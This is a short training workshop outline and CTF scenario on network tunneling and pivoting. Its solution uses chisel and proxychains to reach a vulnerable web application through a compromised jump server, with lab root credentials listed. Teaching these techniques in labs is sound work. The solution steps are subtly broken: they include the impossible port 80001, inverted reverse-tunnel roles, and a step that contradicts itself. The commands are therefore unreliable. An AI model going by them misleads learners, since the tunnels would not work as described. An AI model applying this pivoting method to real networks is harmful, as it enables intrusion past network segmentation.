# Network Tunneling And Pivoting Workshop
## Overview
The participants will learn how to set up and use network tunneling and pivoting techniques to access and exploit services in a simulated environment. The workshop will cover the following topics:

1. Introduction to Network Tunneling & Socks
2. Setting Up `chisel` for Port Forwarding
3. Using ProxyChains for Application Tunneling
4. Introduction to Pivoting Techniques
5. Exploiting Internal Services via Pivoting
6. Hands-On Lab: Real-World Scenarios

## CTF
### Scenario
During a covert red team operation, the team compromised the following servers and set their root passwords:
- Jump: 172.16.5.3:22 - root:hackme123
- Secure: 192.168.80.30:22 - root:Aa123456
The network topology consists of two segments: an internal segment (172.16.5.0/24) and a secure segment (192.168.80.0/24). The jump server (172.16.5.3) acts as a bridge between these two segments. The attacker sits on the internal segment 172.16.5.2.
It is known that the Secure server is running a vulnerable web application on port 80.
The objective is to use the compromised servers to pivot into the secure segment and access sensitive data in the web application.

### Tasks
1. Establish a reverse `chisel` tunnel from the attacker to the Jump server.
2. Use the Jump server as proxy to establish `chisel` tunnel to the Secure server.
3. Exploit the web application to retrieve sensitive data.

### Steps of Solution
1. Connect to attacker machine and set up reverse `chisel` tunnel to Jump server. ``chisel server -p 8000 --reverse`` on Jump server and ``chisel client 172.16.5.3:8000 R:50001:socks`` on attacker machine.
2. Edit `/etc/proxychains4.conf` on attacker machine add the tunnel as a proxy `socks5 127.0.0.1 50001`
3. Connect to Secure via ssh from Jump and establish `chisel` tunnel from Secure to attacker using Jump as a proxy. ``chisel server -p 8001 --socks5`` on Secure server and ``chisel client --proxy socks://127.0.0.1:50001 192.168.80.30:80001 50002:socks`` on attacker machine.
4. Edit `/etc/proxychains4.conf` on attacker machine update the port for the new tunnel proxy `socks5 127.0.0.1 50002`
5. Use proxychains to route traffic through the established tunnels and access the web server.